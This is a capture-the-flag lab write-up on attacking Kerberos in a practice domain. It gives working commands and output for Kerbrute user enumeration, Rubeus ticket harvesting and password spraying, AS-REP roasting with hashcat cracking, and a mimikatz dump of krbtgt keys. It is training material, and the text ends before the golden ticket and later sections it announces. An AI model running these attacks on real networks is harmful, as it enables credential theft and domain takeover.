---
title: THM - Attacking Kerberos
tags: [thm, kerberos, kerbrute, rubeus, impacket, mimikatz]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/b4fe29504727a7fb1cd8715681bf0c21.png" alt="Challenge logo" style="height:150px;">
</div>

This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:

- Initial enumeration using tool like Kerbrute and Rubeus
- Kerbroasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

# Introduction

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "seure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like KTLM that we can use to our advantage.

Some common terminology:

- **Ticket Granting Ticket (TGT):** Authentication ticket used to request service tickets from the TGS for specific resources from the domain
- **Ticket Granting Service (TGS):** The TGS takes the TGT and returns a ticket to a machine on the domain
- **Key Distribution Center (KDC):** A service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service
- **Authentication Service (AS):** The AS issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets
- ****
- ****
- ****
- ****

# Enumeration w/ Kerbrute

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos yuo can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

## Kerbrute Installation

- Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
- Rename `kerbrute_linux_amd64` to `kerbrute`
- `chmod +x kerbrute` to make kerbrute executable

## Enumerating users w/ Kerbrute
Enumerating users allow you to know which user accounts are on the target domain adn which accounts could potentially be used to access the network.

- Download the wordlist from [https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt) 

We will try to enumerate users from a domain controller using a supplied wordlist

```
$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.locl Users.txt

2022/09/12 11:18:08 >  Using KDC(s):
2022/09/12 11:18:08 >   CONTROLLER.local:88

2022/09/12 11:18:09 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2022/09/12 11:18:09 >  [+] VALID USERNAME:       user2@CONTROLLER.local
```

# Harvesting & Brute-Forcing Tickets w/ Rubeus
Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru. It can be used for a variety of attacks such as bruteforcing password, password spraying, overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting and Kerberoasting.

- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) 

Rubeus is already compiled and on the target machine. We have only to log into it through SSH or RDP.

This command tells Rubeus to harvest for TGTs every 30 seconds. The `harvest` action periodically extract all TGTs every `/interval:X` seconds, extract any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. 

```
C:\Users\Administrator\Downloads> Rubeus.exe harvest /interval:30

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (9/12/2022 2:39:30 AM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
  StartTime             :  9/12/2022 2:36:41 AM                                                          
  EndTime               :  9/12/2022 12:36:41 PM                                                         
  RenewTill             :  9/19/2022 2:36:41 AM                                                          
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEg1K0CM9V5VMbIRTcbpe6ZpipGo1Ui24Ebzw 
    jYV4ibjQeoHVJCWSBwAkVguFz8gIfGadsvSSAltGDk3oWp98sSYMsnbWf/2a+ToXiugdxdCzanOhjlOqu0AeLXQIpzwNmVKjISj2 
    xWbGbcr1/xONH9XkpjG/nsV/rkPE8+LezYQdtKmroCty1I7wmTQx6Fe8mhYBmJdJ/6eaPwr2lH1m32TTs0QamfkDkZQbTqtHlbIV
    4uzbp57yK+ADqL69wUHmH/cz7owOb7fadHj9PvEzKOhh8t8RiaGpNHSZPn0wEp9piOdMVtp8N37djqsJofrJbfyxZrKQR+R0bKyN
    w94v7JaN4dNSdYzo6lC66ZBpbVcBUYJGLKnXzyboUB7+WeAC7xwOst/ZLmPH164MKbUsqknON/dRUf0jgom7oeIgCXrQqAZXm+u+
    +78ZhwdItCOLbyWbhEW8JdzVWJRnNn8znuV/rui5Tf/mBiOF1jP4TbAIQ/bMPbzzFA1aPj8nSEkrz8FmaBvhJ5p99iaQwv+3BibU
    YyYUakmM9IEIuxwHwBJXBEhSN91RD/ILIu+8UWs/B/SAn/YZJ4TBnK1jr20lgqjyYHjgMvdzGKhKhtSCaz1eGBsekr6Qd850ZU6J
    ++4KXLScnhjjXhuL2T2DYOItVdbeMUq4e8xbq2iUmgFvfzdbS/AjIyI2SvSEqgDU0Awm65FBW//NCx7yWUnZIcWlJstZ8saf5plz
    jLUnXQwQQpPx6/fdXHBanL3E+vD2sqo2RfMH/oM9NaLRMIfXFk5lLIEAmY4TRme5OuDMjDjStWJ5OSLWvZoEREK1cWCV/KzIhtps
    Z4RKzZ+nav8ivk/YvJOp6uqBW/Y1SmINzxTdidPQuPVvSOuD3EIsAs7SyXXQhUgDTYw31XK5pxET4wOmmO/rW+j7dT1w5LCXZ2Iq
    MTOtafpFgn8+A1Vb0hOldHPYIefkZdZrNTzEMahnqxhs1otcP1WhfCipky7Q7a3p++nE8aJZ0v3QrETd+10TaisZoQLyJibHxRyC
    Kh8Gy+hmpiU3/2Pl8kp+xQPC1PWEWrplj+RR+vr0mdy1KXqntoGsh7NFpB+KZeUPnYU/D23GWwx7DmdHtgL8NSFKtCfSdC4foyP4
    iq2SSg4RAkIvqUe1WVW66XFdsitmebfT9pLSfV6TVS5BD0TiIoDPNTEbeTHLsHgVsPlwV//sTQ7qyCZbRdSpfZj3YaIqEicjb91a
    31jVP3q1zwcasttSbNG+DYJH6qZu3EHwkFk4PXETJeqbY5wKr967zfG7Pow0+N7H4Qsbqo4Di9/W4iSJs1UpAgaE84JkYi63RuHO
    pZNqLeyw97BUpVU3j3eD8LHjdiVQeRhPDF+CFkzd1f/3Ado0DQpPj1GjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBvFxPDWQYxb1I0r66hng/reRAsR+2S6nCTVpwEMCjvQqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDkxMjA5MzY0MVqmERgPMjAyMjA5MTIxOTM2NDFapxEYDzIwMjIwOTE5
    MDkzNjQxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  9/12/2022 2:38:22 AM
  EndTime               :  9/12/2022 12:38:22 PM
  RenewTill             :  9/19/2022 2:38:22 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGg6KYKghgYpNCYEVjH+CEa+Yx1uvbKiU+9g/
    YbrIy3c0VNxvwKAlsDoNbcgHLwBynZAu/RV+FbfdkLPVfwBJ9WZBMQHQtQm4WHez6O9iJ7c+FX5WrmBUmotGSS8NFCswHyMTcUk/
    mTe0nq9VO4fu4hfMTBuGNixCwByQxXwdd7LZyKFeJg6f2ON+nqMS/0CL68w+2OfSOEzdgvs/mOGnYhGWVc3pW2zyG0DaPV40w58C
    Yqs2hQabA4UsnDaWHyS3SFiHHEkPHdSDjtyARgs/gDjiRjpfsAaB3vjcWbVvJD/6JdDWquXXhXz6SWY+oDbUP3u8pbnTEjR7Qq4v
    8WtpKzwtMDKxH1YK4oxWNC+WaIPdNGklt+ayStIqS2XjiIW2oIFWQ6KBmjcXPRnw2yqLzdq0zXk1j5t3z/Mq4Jn4XDpAuzcrINnr
    XXDyzlp7Xhc0kyUjV122NlLrwiaSpifzNuNCD9YWYyOq19Tm5mtxwzgEEqCvujzM/O8REsOWzcjwMffzZpY/VYWFdMcQE07bcZR4
    29RW8nWDPrn+YTxBEPaAJ81e2sU0eklEhwI88hDANkXZ1LPquZTrOAzsh0/2gI5zXXwmqRSJEqsYZ4Ro2AaIK2gnb8RPkqCWR7nW
    kdO8KNyAGrfPaG94D5zguLLLS/+fLFosFiEn3k0re08qQgYF9/q65xMSGsbwEnhzekdH7JijYxCFh7NkXrBbyT6Qn8ObJtmtvwV+
    Ji6iJxkoawzvDCuD+l30+ub6ssZwIIKzNiU+RZeGqSyyUVTvzZ9myhOSzUC85wz0X/oLsbuP3MCH5YlrqmvvftArZo0RaxeMNvQI
    jtBaJldt7IgIH6FyIyu2eiRLjb8xh/PlLU5TAg+PpLouJc7MX2ZtlHdy4B439b2pRidVnG0QNPxD4OkQf+0riTqL5zIhrNjfnbNr
    tBU2YIqebqkZQQjxKIeZ7rC2h1By36ZkBmJUhadzykdZKnTMT8s9b0JZkt5DkKdlhbpLrYEg9JaEyJnK/hM4PFo/hBMeh8kw4g3m
    KBV5GFWYfhpiCHjn5lPkqJoicaAKDd6PPIovkkJtAwQ3v19jWETam4LtgvVZrBP+Dbyh9dRVe7/AsWjBd4CpR9GTv9gYjVCEJI35
    1R+Gy/NS41flP0xxNKHH4YlaX3rS0chOqlJByXdVY7sVwepiTmN9GhjpPZejfxIQ0zHWrv6P9dYSnUGjnwYxDUQIOQqEp7CrESG2
    HIbiZKR70HmhNYcInn/jfy3wwsuy660nzhfHYiL+eiEAz8x41I1QXjBu6DtZz6ybxRWHvZls9Q/nrjeNsgsDbvEfP+hbMqjRHxkF
    lLnklhFpL4QvgdddljeAcKgiZZfdFNuomGF3hFRzsDE/8FLkJogNGBPuicOk7NXaIaOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIIdr5XROmJtYw1xTyjv9W2u2jP/z5LerB0o6S4CN8YUpoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwOTEyMDkzODIyWqYRGA8yMDIyMDkxMjE5MzgyMlqnERgP
    MjAyMjA5MTkwOTM4MjJaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  9/12/2022 2:36:41 AM
  EndTime               :  9/12/2022 12:36:41 PM
  RenewTill             :  9/19/2022 2:36:41 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEmkps+FluSPanL6GhHjjyhnxPFxkaDgaee0X
    nv8y7/HXYlJ2bIoZBti4hUPuomQgp//tT4XXCKDdwDGw1lOIskRu949CtIxcHjQBfnUWwzuBTowNoXohWJ2QY92rEgXKgiKjfZeg
    wdbfu30V07FpOoGnRpOPL9JI9dL/ZqLRBfr5VNkHKoSBqKqZBj4mMgl7pfXaemo/cMGpJxOUxRJErkJgv4V2Xg2/wiaQ1xuB0pCZ
    cLGItpyTvPKTXVu1Y3JP4Go59C9Hxh40dDZ0IdIMZJaJhQqxcQZeTxMdMrpS4hSzF+ncRpC+h/S/KKG0JRUdZaKu+IZljVcDAHp2
    bYt/n1EQKTVbYsVwJrPRKB9Q7rgZayIJnrIPrCu2O1AiCch4zNV6hWxuPnoNpOMLmyfASa6gwE7tbiTs/tg/yLSZeti4RlzNeZCg
    zgHNRZfHdvbcA0B2nF+U0Q4c9KszDZ7YC4qLKyJ+ATlcLonGbkHx7t63R+BFNiGEnjPXXcuJxt7HoRJXlMTPI17mOm+5uK+8ZSW7
    UN2BVNleKvbVtNApkxNpGairzuXnKOVWaO8ONc4xex97FSeSFvRk2Hd4prYdlHpGMoPhZ2we41axh9+364caQ0BO8NitpygIElWt
    ePPr2rki49T1K5LmY572cTC0Wmx50Yq49f4JuKrzzeMArVxVQhTw55srIEuFTsNzadrDB5DohemkiEKQ4205EfXo98bfKcYrdFIe
    co2Icmo40QXS5Ib8Dpn9XykUA2rOTrkCs1tMA6M6r0/rs6B0F5OC0UtTpUXIq+1yo5wVGT9wy8GdjaomJjoOjNFtG+XfruyBbEKv
    mqx+lxnWu0bU+i0iCn0k2Y83yOnBK9Wz/ikou4ifFnGT+wNKSLgDEBq3xHOBsPo1Rhtnb7dRnt8hofi4zZhUgttxyVlekepAEQeK
    Yegnin7AURK+ImvIOtJ6sdCrUXDVkIRTShtVUbEckcgACe/MxCm80z6uuVVFmtpeRqlDmq1ScM74AgrnERGK1EoZoE+oppcOEY05
    ONMh7v98TTjsd1YgECAgQsmqDDKxDzo1l1aOevqfVkdFUy3BKoR6bmMwN4N43L162TK5ja/r///epfr8a9c9ikhaaybrXTlEE2kO
    wsM3yqzAQs5Mh09BDf//xvribOe7CXen49IrfGMOJcTGAHMkCOvQAp6TG3V2l7msz8nwm13VgNrpOpx0YZDQVAx6nkNZh3Hcle1f
    fffSASsE7CcFJdSrZ2Kd2BXDq4w9TRMHnSfsh3hhMW/WuWr1nXOKeamTRjmeH1YW+ddXwR243e6p2bjUzFEPCCnn3QI+NHj0lyN4
    aQ6QPGb0FgGeCvvrWAVPtwprPjHedg3RpoaVI6hToQ+GP9WSNXTKdpmjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCDpt98eOdX8PNly63COrAxVnHqgmupzXKinVPAl1RBAY6ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIyMDkxMjA5MzY0MVqmERgPMjAyMjA5MTIxOTM2NDFapxEYDzIwMjIwOTE5
    MDkzNjQxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
```

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file.

```
C:\Users\Administrator\Downloads> echo 10.10.79.220 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\Downloads> Rubeus.exe brute /password:Password1 /noticket

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7X5jDNej2iF5f1pJiq0CyaD/RNnxz3MLWVY0/KlZceZruw9O6eN4gptAKWdIbP1B8+FiBERdxF6R
      hSzgQLpd6buWMjZzY165bGBpGK9Dd3t989gboqKvD1wXon7I4CVFnaEW8TnSyUauPdMFYft8V+ilE7Kt
      M5C9PI9TSPJyaUkTOS0NZvqiNrWBuD4qq8rtQERSQADejaMfQibusIj4WkycUUxvMC4wXsAIMoEBD9YM
      Ta2ZJgBrbiZ98Gkg3nyHl4YQ0QK+wEYiN7T+/MPc6PLkijsMNsHVG41OmokxfKv3vXqmWdLqIScm7z2f
      5VB4q+MhrxL8RupeE5s2Q++mGtnuyyUHxaMHg7pwRsGuxAASAF6KfIGNMjoO82i7ui+1//8EEF7SstZX
      OOqh4wlSRdup5Xh8AxOj0u9Tzgw3ivIreqVP7VXtpRhwnvPrf3cENbNs4ENiCyIfVCWVXAnKYAnkf7gf
      WyTUEnODw0dP9MlHGglN6d8rrZWk9jEWISvInmgk+MrnXeALRwF8q134idvz3v2DxF5aULdM4HV02xIo
      VEY51+I4gxaTlEkuQsVPiJtcQeiuyX6OITsl4F6bkKd2OVIIQ1LdITDMJzuoIqbGM+kpuOEODBTctLRd
      7i6dsihQ+bZf6TWi6NJ4f/ZPDd9dTOOtjVaQvi3NlCjMBcZtsuRgC53ieiGq7/54P6ZqE5InZZK1mllM
      Gg2bryfL5uOyQu0mMfuXO7ZrhSqLoRiojF3KS/aTXOWT68GjmUQ+zLNmFcGjSz7gctroHxdz9SRiQezy
      KwnGMa8ijzvkrFuUiO0y2m7TicWigN795b30pmwBA38qN6DR5h9B1aiBoiSO8AuKRLnajMZXIfh95RUd
      78UCuOSF09MsDc5ipPlqoIpo3SvNzqGikeeIt4GSkV9Nfx5NbWXSvOoOz5slLtE0uivrrbmOzxydqkRE
      Y8215pLrqap/gUBuC7UcYszbUWQQpz4oRpzSrKhRECEar78AHaPEEoSNxNdbT991JJJF4IBbyQNLnKzG
      K5ZgQrsMNUW2hWDDVfhuFtAi4UwNoWyxWZDyeWnkq8/btVYx+XlaQsK0vO4TfIgCPPuXiEWWSWxQhQwO
      FN3NW5mzdvGMtPLS4qdzZuzx7FWTpLfQWFTMOKhbSuMDDYueVls/kexouBiZTB8zZ3+QQ+dmJUCwFUzu
      98CQyvuv5iDOzP5bsRxhSXlfvD6Dm+rIjL9jntbFwYyj588vpegMVaznikdmEJAumOHRrQgHBqBRhR5V
      al2bgh0y00Lo8zCjqy+c5CiQp+YFJi3+JeQIGKsqV2h4+cbhrxKIlnQqExawZJtpQKOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIKhyMZpMwU215u2/yya0NkPY1pJq3H9mhIzm
      fyqKZST1oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDYyOTE1NDYxMVqmERgPMjAyMTA2MzAwMTQ2MTFapxEYDzIwMjEwNzA2MTU0NjExWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```

```
C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::3055:6a66:ed1a:a319%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:56AE7B0D92117484110A514362EF69D8$F1F2EA9B723D
      DF2FC5DB743DEA670EB121EC69975BBCBFB02E851216E0F7FB43ECB52E0CFEB6512EA0EB4EAC4FB7
      511FF8078F8EBC1567159D65A0EF4F5816CC4A3D7FFD29FC786CE0C07CE9C6C3C6AB9C38EDA4CB58
      A82AC2C7E2951F42A877B1069DC8D83D9CDF44DDE04E9822AA17E9CD525E6BBFA0465AB677D27C32
      74DCF587D6FB848EDB9FF6B0FB0FC5051FC0585CA4DC794B506E237DEB0A3DD11F184C48A9341F65
      EA0A02583C7EA6EAFA9D51E1442581E0CD3598F4A03CC394BE7BCEF68376BF35D37CC8A36D596551
      9E3F60DF9284CDC63C07B7D7465A033AA0536014721EB181DA9FD5FD74AD0E05125A07F70066

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::3055:6a66:ed1a:a319%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:2AF5CB405BDD67E3863CE5A32ED8308D$9E1C312E02F14
      BB6DD36B25ECED1CE8D33B305F33B018E035990D1A0D6A7F7F9EC69063A90CC24063CE5A9FAEE148
      2F62FD0EFE54A9C21F45F01827668FA47C7C798F5D3DB35FA48B7CFF7988339249649247F868CBD6
      45FDE6CFEC02B5EDAA4B12E0C0BEA61248FDE6509DA3657E23B24A9AF69E32672A22C76D2D62FE46
      D3759AD4F08AB4C8C62EB6633A49D937C6ACFB5655709E200D2B7852F30DFC5FB83E3BBF60B80227
      35ED6F046E1ED2276540C724A1E1CDF0073E7B32B6E1A03B9EA04BD29A71F99CCDE43CF6F23E3E74
      3047AB9789FF86FE62534585993F9075178F3A8095890899ACA448317D8B3C8171BCCD3B067
```

```
$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$User3@CONTROLLER.local:2af5cb405bdd67e3863ce5a32ed8308d$9e1c312e02f14bb6dd36b25eced1ce8d33b305f33b018e035990d1a0d6a7f7f9ec69063a90cc24063ce5a9faee1482f62fd0efe54a9c21f45f01827668fa47c7c798f5d3db35fa48b7cff7988339249649247f868cbd645fde6cfec02b5edaa4b12e0c0bea61248fde6509da3657e23b24a9af69e32672a22c76d2d62fe46d3759ad4f08ab4c8c62eb6633a49d937c6acfb5655709e200d2b7852f30dfc5fb83e3bbf60b8022735ed6f046e1ed2276540c724a1e1cdf0073e7b32b6e1a03b9ea04bd29a71f99ccde43cf6f23e3e743047ab9789ff86fe62534585993f9075178f3a8095890899aca448317d8b3c8171bccd3b067:Password3

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$User3@CONTROLLER.local:2af5cb405bdd67...d3b067
Time.Started.....: Mon Sep 12 13:15:44 2022 (0 secs)
Time.Estimated...: Mon Sep 12 13:15:44 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   494.9 kH/s (1.23ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 143360/14344385 (1.00%)
Rejected.........: 0/143360 (0.00%)
Restore.Point....: 142336/14344385 (0.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: albarran -> 260408
Hardware.Mon.#1..: Util: 94%
```

```
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6 

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d 
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2 
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db 

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b 
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
```

```

```